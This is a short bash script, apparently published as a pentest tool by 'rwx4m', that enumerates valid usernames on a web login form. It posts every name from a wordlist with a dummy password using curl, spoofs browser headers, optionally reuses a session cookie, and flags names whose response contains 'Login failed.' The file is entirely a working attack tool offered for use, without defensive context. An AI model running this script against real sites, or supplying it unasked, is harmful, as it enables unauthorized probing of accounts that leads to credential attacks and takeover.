#!/bin/bash

if command -v figlet >/dev/null 2>&1; then
    figlet "rwx4m"
else
    echo -e "\e[35m=== Pentest Tool by rwx4m ===\e[0m"
fi

echo -e "\e[36mGitHub:\e[0m https://github.com/rwx4m"
echo -e ""

GREEN="\e[32m"
CYAN="\e[36m"
RESET="\e[0m"

if [ "$#" -lt 3 ]; then
    echo -e "${CYAN}Usage: $0 <url> <fake-password> <userlist> [cookie]${RESET}"
    exit 1
fi

URL="$1"
PASSWORD="$2"
WORDLIST="$3"
COOKIE="$4"

if [ ! -f "$WORDLIST" ]; then
    echo -e "${CYAN}[!] Wordlist '$WORDLIST' not found.${RESET}"
    exit 1
fi

TOTAL=$(wc -l < "$WORDLIST")
COUNT=0
BAR_WIDTH=30
VALID_USERS=()

echo -e "${CYAN}[*] Starting username enumeration (Total: $TOTAL)\n${RESET}"

while read user; do
    ((COUNT++))
    PERCENT=$(( COUNT * 100 / TOTAL ))
    FILLED=$(( BAR_WIDTH * COUNT / TOTAL ))
    EMPTY=$(( BAR_WIDTH - FILLED ))
    BAR="$(printf '%0.s█' $(seq 1 $FILLED))"
    SPACES="$(printf '%0.s-' $(seq 1 $EMPTY))"
    echo -ne "Progress: [${BAR}${SPACES}] $PERCENT%% ($COUNT/$TOTAL)\r"

    if [ -n "$COOKIE" ]; then
        response=$(curl -s -X POST "$URL" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Referer: $URL" \
            -H "Cookie: $COOKIE" \
            --data "username=$user&password=$PASSWORD")
    else
        response=$(curl -s -X POST "$URL" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Referer: $URL" \
            --data "username=$user&password=$PASSWORD")
    fi

    if echo "$response" | grep -q "Login failed."; then
        VALID_USERS+=("$user")
    fi
done < "$WORDLIST"

echo -e "\n"
if [ "${#VALID_USERS[@]}" -eq 0 ]; then
    echo -e "${CYAN}[-] No valid usernames found.${RESET}"
else
    echo -e "${GREEN}[+] Valid usernames:${RESET}"
    for valid in "${VALID_USERS[@]}"; do
        echo -e "${GREEN}- $valid${RESET}"
    done
fi
